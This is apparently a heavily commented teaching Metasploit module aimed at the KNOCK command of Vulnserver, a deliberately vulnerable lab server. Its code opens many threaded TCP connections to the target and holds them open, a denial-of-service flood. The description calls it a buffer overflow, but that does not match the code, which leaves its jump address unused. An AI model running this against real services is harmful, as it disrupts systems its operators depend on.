##
# The # symbol starts a comment
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
# File path: .msf4/modules/exploits/windows/vulnserver/knock.rb
##
# This module exploits the KNOCK command of vulnerable chat server
##
require 'socket'                              # Include the socket library to gain TCP/IP functionality
class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module inheriting from the remote exploit class
  Rank = NormalRanking	# Potential impact to the target

  include Msf::Exploit::Remote::Tcp	# Include remote tcp exploit module

  def initialize(info = {})	# i.e. constructor, setting the initial values
    super(update_info(info,
      'Name'           => 'Vulnserver Buffer Overflow-KNOCK command DoS',	# Name of the target
      'Description'    => %q{	# Explaining what the module does
         This module exploits a buffer overflow in an Vulnerable By Design (VBD) server to crash the system. 
      },
      'Author'         => [ 'fxw' ],	## Hacker name
      'License'        => MSF_LICENSE,
      'References'     =>	# References for the vulnerability or exploit
        [
          [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/edit/main/MetasploitNewModule' ]
        ],
      'Privileged'     => false,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done 
        },      
      'Payload'        =>	# How to encode and generate the payload
        {
 #         'Space'    => 5000,	# Space that can hold shellcode? No need in this exploit
          'BadChars' => "\x00\x0a"	# Bad characters to avoid in generated shellcode
        },
      'Platform'       => 'Win',	# Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
      'Targets'        =>	#  targets for many exploits
        [
          [ 'vulnserver-KNOCK',
            {
              'jmpesp' => 0x6250151C # This will be available in [target['jmpesp']]
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public


      register_options([
            OptInt.new('ThreadNum', [ true, 'A hex or decimal', 10]),                   # Creates Datastore object ThreadNum to control the number of threads to create
            OptAddress.new('RHOST', [ true, 'Set IP of Reciving Host', '127.0.0.1' ]),  # Creates Datastore object RHOST to control the target IP address
            OptPort.new('RPORT', [true, 'Set Port of Reciving Host', 9999]),            # Creates Datastore object RPORT to control the port number to connect to 
        ])
  end

  def startExploit                            # Function threads use to connect and then stay connected to the server 
      print_status("Connecting to target with IP #{datastore['RHOST']} and Port #{datastore['RPORT']}")
      s = TCPSocket.new datastore['RHOST'], datastore['RPORT'] # Connect to the server
      #connect #connect to target using values stored in datastore
      while(1)
        s.gets # Read the response from the server
      end
  end
    
    
  def exploit	# Actual exploit
      for x in 1..datastore['ThreadNum'] do
        Thread.new{startExploit()} # Run startExploit for each thread
        print_status("Connecting on thread #{x}")
      end
      print_status("Finished sending messages")
  end
end
